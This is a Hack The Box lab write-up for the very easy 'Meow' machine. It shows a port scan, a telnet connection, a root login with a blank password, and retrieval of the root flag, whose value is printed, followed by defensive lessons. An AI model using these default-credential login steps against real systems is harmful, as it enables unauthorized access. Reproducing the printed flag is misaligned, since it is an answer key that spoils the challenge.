# HTB - Meow Notes

## Overview

**Machine Name:** Meow

**Difficulty Level:** Very Easy

**IP Address:** 10.129.237.177

**Objective:** Gain access via **Telnet (Port 23)** and retrieve the **root flag**.

## Step 1: Reconnaissance

### **Check if the Target is Online**

We first test if the machine is responsive by sending ICMP echo requests:

```bash
ping 10.129.237.177
```

### **Expected Output:**

- If the host is **up**, you should see **64 bytes** responses.
- If there’s **100% packet loss**, the machine may be down.

### **Scan for Open Ports and Services**

We run an **Nmap scan** to detect open ports and running services:

```bash
nmap -p- -sV 10.129.237.177
```

### **Results:**

```
PORT   STATE SERVICE VERSION
23/tcp open  telnet
```

- **Telnet (Port 23)** is open, indicating a potential security risk.

## Step 2: Exploitation (Gaining Access)

### **Connect to Telnet**

Since Telnet is **unauthenticated**, we attempt to connect:

```bash
telnet 10.129.237.177
```

### **Expected Response:**

You should receive a prompt asking for **login credentials**.

### **Attempt Login with Default Credentials**

Many **misconfigured systems** allow access with default or blank passwords. We try logging in as `root` with no password:

```bash
Meow login: root
(Press Enter when prompted for a password)
```

Successfully logged in as **root**!

## Step 3: Capture the Root Flag

### **Navigate to the Root Directory**

Once inside the system, list files in the `/root` directory:

```bash
ls -la /root
```

### **Expected Output:**

```
-rw-r--r--  1 root root 33 Mar 14 15:59 root.txt
```

### **2️⃣ Retrieve the Flag**

```bash
cat /root/root.txt
```

### **Root Flag:**

```
b40abdfe23665f766f9c61ecba8a4c19
```

Submit the flag to **HTB**!

## Step 4: Lessons Learned

- **Telnet is highly insecure** as it transmits data in plaintext.
- Always **disable Telnet** and use **SSH (port 22)** for secure remote access.
- **Default credentials are a major security risk**—always change them!